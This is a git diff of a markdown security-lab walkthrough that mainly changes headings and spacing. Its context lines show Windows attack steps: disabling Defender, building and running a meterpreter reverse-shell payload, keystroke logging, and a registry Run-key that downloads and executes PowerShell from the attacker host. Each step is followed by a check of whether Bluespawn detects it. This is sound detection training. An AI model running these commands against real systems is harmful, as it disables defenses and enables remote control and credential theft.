@@ -219,9 +219,9 @@ Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup
 It should look like this:
 
 <img width="781" height="529" alt="image" src="https://github.com/user-attachments/assets/5932de02-775a-4e2a-b2e4-bd976a0dc2e3" />
+<hr>
 
-
-# If you have more time
+## Step 4: If You Have More Time
 
 Let’s begin by disabling **Defender**. Simply run the following from an **Administrator PowerShell** prompt:
 
@@ -234,7 +234,6 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
 <img width="820" height="139" alt="2026-03-26_10-20" src="https://github.com/user-attachments/assets/446b50ed-75b5-4e04-a505-559833112aa1" />
-
 
 This will disable **Defender** for this session.
 
@@ -285,13 +284,11 @@ Run the following commands to start a simple backdoor and backdoor listener:
 cd /tmp/
 ```
 
-
 Run the following commands to start a simple backdoor and backdoor listener: 
 
 ```bash
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
 ```
-
 <img width="934" height="119" alt="image" src="https://github.com/user-attachments/assets/fd99899d-5962-4fcf-973e-18ab23db5ae2" />
 
 Now let's start the **Metasploit** Handler
@@ -321,7 +318,6 @@ exploit
 ```
 
 It should look like this:
-
 <img width="738" height="237" alt="image" src="https://github.com/user-attachments/assets/c0f71b47-4b0b-4b37-b016-0851c5932845" />
 
 Open up a **Powershell** terminal, copy the file over from **Linux**
@@ -335,7 +331,6 @@ scp ubuntu@linux.cloudlab.lan:/tmp/TrustMe.exe .
 ```
 
 Open a **Command Prompt**
-
 <img width="370" height="195" alt="image" src="https://github.com/user-attachments/assets/f8875993-3492-4208-9fd6-617283ea298f" />
 
 
@@ -352,7 +347,6 @@ TrustMe.exe
 ```
 
 Back at your Ubuntu terminal, you should have a metasploit session!
-
 <img width="940" height="466" alt="image" src="https://github.com/user-attachments/assets/8458c8b8-63fc-4749-9d74-730f205cd773" />
 
 Now, let’s look at keystroke logging.
@@ -362,9 +356,7 @@ To learn more about this check out MITRE:
 https://attack.mitre.org/techniques/T1056/
 
 Here are some examples of threat groups, software, and campaigns associated with this technique:
-
 <img width="1385" height="756" alt="image" src="https://github.com/user-attachments/assets/4a0aafa0-dcf7-4c7b-a7d6-fdd8e01b3064" />
-
 
 Run commands
 
@@ -373,9 +365,7 @@ meterpreter > `keyscan_start`
 Go and type something on your Windows system.
 
 meterpreter > `keyscan_dump`
-
 ![](attachments/Clipboard_2020-06-15-13-52-00.png)
-
 
 Go and check Bluespawn.  Did it detect it?
 
@@ -389,7 +379,6 @@ Here are just some of the groups that use this technique:
 
 <img width="1386" height="489" alt="image" src="https://github.com/user-attachments/assets/d2446939-e59a-4c36-8a2f-46472a274834" />
 
-
 meterpreter > `shell`
 
 C:\Users\Administrator\Desktop> `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /d "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://[Your Linux IP Address]:80/a'))\"" /f`
@@ -399,7 +388,9 @@ C:\Users\Administrator\Desktop> `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\Cur
 <img width="1514" height="880" alt="image" src="https://github.com/user-attachments/assets/bc7ffe81-a9c5-42d5-b565-e9a640eb5301" />
 
 Go and check Bluespawn.  Did it detect it?
+<hr>
 
+### Privilege Escalation
 Next, let’s play with privilege escalation.
 
 Here is al link to more info about this from MITRE:
